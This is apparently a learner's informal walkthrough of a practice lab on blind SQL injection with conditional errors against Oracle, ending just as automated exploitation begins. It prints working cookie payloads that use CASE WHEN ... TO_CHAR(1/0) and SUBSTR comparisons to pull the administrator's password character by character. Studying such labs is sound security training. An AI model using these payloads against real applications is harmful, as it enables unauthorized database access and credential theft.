### Lab: Blind SQL injection with conditional errors

Lab: Blind SQL injection with conditional errors
                                                                     PRACTITIONER             
                            LAB                    Not solved            
        
             This lab contains a blind SQL injection vulnerability. The  application uses a tracking cookie for analytics, and performs a SQL  query containing the value of the submitted cookie.         
             The results of the SQL query are not returned, and the  application does not respond any differently based on whether the query  returns any rows. If the SQL query causes an error, then the application  returns a custom error message.         
             The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.         
             To solve the lab, log in as the administrator user.         

             
So on the first glance it wont work 

                               
                               


So as you can see the paylaod is not working, so what we can do is looking for one of the tow options 
1. Check the hint 
2. Check the solution 

Its to realy to say i lost so lets only check the hint 
It said : 
                                
 Hint
                                     This lab uses an Oracle database. For more information, see the SQL injection cheat sheet.                 
            




Since, its an oracle db we can do this 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

so this is what i want to do:
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
Oracle, version:
xyz' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a

One of the best fealings 





Lets brake this down:

xyz' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a

xyz: The vulnrable part of the request
AND: After setting up the place holder we want to add something 
(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual : Giving an argument than naver could be right And forcing another argument then never can be right, Otherwise something wish is a = a wish is true and this get excuted right

On the other hand we are 

xyz' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a

CASE WHEN (1=1) THEN TO_CHAR(1/0) : When 1 = 1 wish is True we ask the sql DB to devide 1/0 wish is impossible This force the sql server to show the error even its programmed to never show an error 






Now what we needed to do is this:
Conver this to the oracle version
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

oracle version:
well we don't actually need to change something 
' AND (SELECT CASE WHEN (Username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM users)='a

So, I've been stuck at this for a long time now lets see the solution and learn from it 

By doing this :


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
TrackingId=xyz'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




This, is what we've got :



On the other hand as we can see :


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
TrackingId=xyz''

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



So what tis means ? 

This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.

Like when we say CASE in sql its like opening a fucntion in programming 

This is what they suggested in the solution wish didn't wrok for me:


TrackingId=xyz' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')'

This is my costumasation for it :

 AND (SELECT CASE WHEN SUBSTR(password,1,1)='b' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'-- 
 
 
 
 
 
 
 
 Now lets do the exploitation Using multipule paylaods:
 
 
 
 Since burp taking for ever i'll try owasp zap tool to see if its going to run faster 

